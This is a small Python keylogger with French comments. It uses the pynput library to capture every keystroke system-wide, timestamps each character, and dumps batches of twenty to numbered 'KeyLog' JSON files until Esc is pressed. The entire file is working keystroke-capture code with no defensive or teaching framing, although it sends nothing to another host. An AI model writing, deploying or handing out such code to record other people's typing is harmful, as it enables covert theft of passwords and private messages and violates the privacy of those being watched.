from pynput import keyboard
from datetime import datetime
import json

nbrFichier = 0
nbrTableau = 0
caracteres = []

def writeJSON(caracteres):
    global nbrFichier
    with open(f"KeyLog_{nbrFichier}", 'w') as fichier_json:
        json.dump(caracteres, fichier_json, indent=2)

def on_press(key):
    global nbrFichier,nbrTableau,caracteres

    try:
        print(f"{key}")
        nCaractere =  {
            "touche":f"{key.char}",
            "log":f"{datetime.now()}"
        }
        
        nbrTableau +=1
        caracteres.append(nCaractere)
        
        if nbrTableau>= 20:
            writeJSON(caracteres)
            nbrTableau = 0
            nbrFichier +=1
        
    except AttributeError:
        print(f"Touche spéciale pressée : {key}")

def on_release(key):
    if key == keyboard.Key.esc:
        exit()
        return False

# Configurez les gestionnaires d'événements
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    # Gardez le programme en cours d'exécution
    listener.join()
